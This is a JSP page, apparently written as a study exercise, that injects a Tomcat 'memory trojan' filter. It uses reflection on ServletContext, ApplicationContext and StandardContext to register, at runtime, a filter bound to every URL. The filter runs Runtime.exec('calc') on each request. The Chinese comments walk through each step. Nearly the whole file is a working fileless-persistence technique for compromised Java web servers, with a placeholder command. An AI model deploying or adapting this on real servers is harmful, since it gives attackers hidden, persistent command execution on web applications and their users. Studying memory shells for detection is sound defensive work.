<%@ page import="javax.servlet.annotation.WebFilter" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="javax.naming.NamingException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.catalina.Context" %><%--
  Created by IntelliJ IDEA.
  User: hasee
  Date: 2023/5/5
  Time: 9:58
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%!
    @WebFilter(urlPatterns = "/*")
    public class MemoryTrojanFilter implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            Runtime.getRuntime().exec("calc");
            chain.doFilter(request, response);
        }

        @Override
        public void destroy() {
        }
    }
%>
<%
    // 动态注册 Filter
    // 1. 获取 StandardContext
    ServletContext servletContext = request.getServletContext();
    // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    // 通过反射拿到 servletContext 具体的 ApplicationContext
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
    // 2. 向 standardContext 的 filterConfigs、filterDefs、filterMaps 中插入值
    // 2.1.1 先创建 filterDef
    FilterDef filterDef = new FilterDef();
    MemoryTrojanFilter memoryTrojanFilter = new MemoryTrojanFilter();
    filterDef.setFilter(memoryTrojanFilter);
    filterDef.setFilterClass(String.valueOf(memoryTrojanFilter.getClass()));
    filterDef.setFilterName(memoryTrojanFilter.getClass().getName());
    // 2.1.2 往 filterDefs 里面插值
    standardContext.addFilterDef(filterDef);
    // 2.2.1 创建 filterMap
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName(memoryTrojanFilter.getClass().getName());
    filterMap.addURLPattern("/*");
    // 2.2.2 插入到 filterMaps
    standardContext.addFilterMap(filterMap);
    // 2.3.1 创建 ApplicationFilterConfig
    // 无法通过 new 直接创建，因为 ApplicationFilterConfig is not public in 'org.apache...'. Cannot be accessed from outside package
    // 因此只能通过反射来创建对象
    Class<ApplicationFilterConfig> applicationFilterConfigClass = ApplicationFilterConfig.class;
    ApplicationFilterConfig applicationFilterConfig = null;
    try {
        Constructor<ApplicationFilterConfig> applicationFilterConfigConstructor = applicationFilterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);
        applicationFilterConfigConstructor.setAccessible(true);
        applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);
    } catch (NoSuchMethodException e) {
        throw new RuntimeException(e);
    }
    // 2.3.2 把 applicationFilterConfig 放入到 filterConfigs 当中，standardContext 中没有直接放入的方法，还得通过反射拿到 filterConfigs
    try {
        Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
        filterConfigsField.setAccessible(true);
        HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(standardContext);
        // 2.3.3 把 applicationFilterConfig 放入到 filterConfigs 当中
        filterConfigs.put(memoryTrojanFilter.getClass().getName(), applicationFilterConfig);
    } catch (IllegalAccessException e) {
        throw new RuntimeException(e);
    }
%>
</body>
</html>
